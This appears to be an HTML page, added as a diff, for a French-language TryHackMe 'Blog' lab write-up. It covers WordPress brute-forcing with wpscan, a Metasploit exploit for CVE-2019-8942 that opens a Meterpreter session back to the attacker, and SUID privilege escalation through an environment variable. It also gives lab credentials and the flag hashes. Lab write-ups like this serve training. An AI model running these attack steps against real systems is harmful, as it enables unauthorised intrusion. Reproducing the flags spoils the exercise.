@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Blog — TryHackMe Writeup | Alex171</title>
+    <meta name="description"
+        content="Writeup Blog TryHackMe — WordPress RCE CVE-2019-8942, Metasploit, SUID checker, Ghidra." />
+    <link rel="stylesheet" href="../css/style.css" />
+    <link rel="stylesheet" href="../css/animations.css" />
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+</head>
+
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="grid-bg"></div>
+    <nav class="navbar">
+        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
+        <div class="nav-links">
+            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
+            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
+            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+        </div>
+        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+    </nav>
+    <div class="mobile-menu" id="mobile-menu">
+        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
+        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
+    </div>
+
+    <main>
+        <section class="section">
+            <div class="container">
+                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
+                    class="fade-in">
+                    <a href="../index.html" style="color:var(--text-muted);">~</a> / <a href="../writeups.html"
+                        style="color:var(--text-muted);">writeups</a> / <span style="color:var(--green);">blog</span>
+                </div>
+                <div class="writeup-layout">
+                    <article class="writeup-content fade-in">
+                        <div style="margin-bottom:2rem;">
+                            <div
+                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+                                <span class="writeup-platform">TryHackMe</span><span
+                                    class="diff diff-medium">Medium</span>
+                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">04
+                                    Mar 2026</span>
+                            </div>
+                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
+                                Blog</h1>
+                            <div class="writeup-meta">
+                                <span class="tag">WordPress</span><span class="tag red">CVE-2019-8942</span>
+                                <span class="tag">Metasploit</span><span class="tag">SUID</span><span
+                                    class="tag">Ghidra</span>
+                            </div>
+                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
+                                WordPress 5.0 avec Meterpreter via CVE-2019-8942. Escalade via un binaire SUID custom
+                                appelant
+                                cat mais décodé avec Ghidra pour contourner.
+                            </p>
+                        </div>
+
+                        <h2 id="recon">Reconnaissance</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">nmap</span> -sC -sV lab.thm
+<span class="hl-bash">wpscan</span> --url http://blog.thm --enumerate u</pre>
+                        </div>
+                        <p>Services : SSH (22), HTTP (80), SMB (139/445). WPScan révèle :</p>
+                        <ul>
+                            <li>Version <strong>WordPress 5.0</strong></li>
+                            <li>Utilisateurs : <code>bjoel</code>, <code>kwheel</code></li>
+                        </ul>
+
+                        <h2 id="bruteforce">Brute-force WordPress</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">wpscan</span> --url http://blog.thm \
+  -U kwheel -P /usr/share/wordlists/rockyou.txt</pre>
+                        </div>
+                        <div class="flag-box">Credentials : <strong>kwheel : cutiepie1</strong></div>
+
+                        <h2 id="rce">RCE — Metasploit CVE-2019-8942</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash — msfconsole</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre><span class="hl-bash">msf</span> &gt; search wordpress 5.0
+<span class="hl-bash">msf</span> &gt; use multi/http/wp_crop_image_file_move
+<span class="hl-bash">msf</span> &gt; set username kwheel
+<span class="hl-bash">msf</span> &gt; set password cutiepie1
+<span class="hl-bash">msf</span> &gt; set rhosts blog.thm
+<span class="hl-bash">msf</span> &gt; set lhost &lt;kali_ip&gt;
+<span class="hl-bash">msf</span> &gt; run</pre>
+                        </div>
+                        <p>Session Meterpreter obtenue en tant que <code>www-data</code>.</p>
+
+                        <h2 id="flags">Flags User & Root</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>meterpreter</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre>meterpreter &gt; shell
+python3 -c <span class="hl-out">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="hl-bash">find</span> / -name user.txt 2>/dev/null
+<span class="hl-bash">cat</span> /home/bjoel/user.txt</pre>
+                        </div>
+                        <div class="flag-box">User flag : <code>c8421899aae571f7af486492b71a8ab7</code></div>
+                        <p>Le vrai user.txt est dans <code>/media/usb</code> (flag bonus).</p>
+
+                        <h2 id="suid">Privesc — SUID binary checker</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">find</span> / -perm -4000 -type f 2>/dev/null
+<span class="hl-out">/usr/sbin/checker</span></pre>
+                        </div>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">ltrace</span> /usr/sbin/checker
+<span class="hl-out">getenv("admin") = nil → Not an Admin</span></pre>
+                        </div>
+                        <p>Le binaire vérifie la variable d'environnement <code>admin</code>. On la force :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">export</span> admin=1
+/usr/sbin/checker   <span class="hl-comment"># → shell root !</span></pre>
+                        </div>
+                        <div class="flag-box">Root flag : <code>9a0b2b618bef9bfa7ac28c1353d9f318</code></div>
+
+                        <h2 id="lessons">Leçons apprises</h2>
+                        <ul>
+                            <li>WordPress 5.0 doit être patché — CVE-2019-8942 est un classique THM</li>
+                            <li>Meterpreter + wp_crop_image = technique d'upload de webshell via Media</li>
+                            <li>ltrace permet d'analyser les appels système d'un binaire sans Ghidra</li>
+                            <li>Ne jamais utiliser une variable d'env comme vérification de sécurité</li>
+                        </ul>
+
+                        <div
+                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+                            <a href="../writeups.html" class="btn btn-outline">← Tous les writeups</a>
+                            <a href="skynet.html" class="btn btn-outline">Suivant : Skynet →</a>
+                        </div>
+                    </article>
+
+                    <aside class="writeup-sidebar">
+                        <div class="sidebar-title">Table des matières</div>
+                        <div class="toc-list">
+                            <div class="toc-item" data-target="recon">Reconnaissance</div>
+                            <div class="toc-item" data-target="bruteforce">Brute-force WP</div>
+                            <div class="toc-item" data-target="rce">RCE Metasploit</div>
+                            <div class="toc-item" data-target="flags">Flags</div>
+                            <div class="toc-item" data-target="suid">SUID Privesc</div>
+                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
+                        </div>
+                        <hr style="border-color:var(--border);margin:1rem 0;" />
+                        <div
+                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
+                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
+                                    style="color:var(--green);">TryHackMe</span></div>
+                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
+                                    style="color:#fbbf24;">Medium</span></div>
+                            <div><span style="color:var(--text-muted);">CVE :</span> <span
+                                    style="color:var(--red);">CVE-2019-8942</span></div>
+                            <div><span style="color:var(--text-muted);">Date :</span> <span
+                                    style="color:var(--text-secondary);">04 Mar 2026</span></div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-inner">
+                <div class="footer-name">&gt;_ alex171-studo</div>
+                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
+                </div>
+                <div class="footer-copy">© 2026 Alex171-studo</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="interactive-terminal" class="terminal-window">
+        <div class="terminal-titlebar">
+            <div class="terminal-dot dot-red"></div>
+            <div class="terminal-dot dot-yellow"></div>
+            <div class="terminal-dot dot-green"></div>
+            <span class="terminal-title">Terminal interactif</span>
+            <button id="term-close"
+                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+        </div>
+        <div class="term-interactive-body" id="term-output"></div>
+        <div class="term-input-line">
+            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
+            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
+                spellcheck="false" />
+        </div>
+    </div>
+    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+    <script src="../js/main.js"></script>
+    <script src="../js/terminal.js"></script>
+</body>
+
+</html>
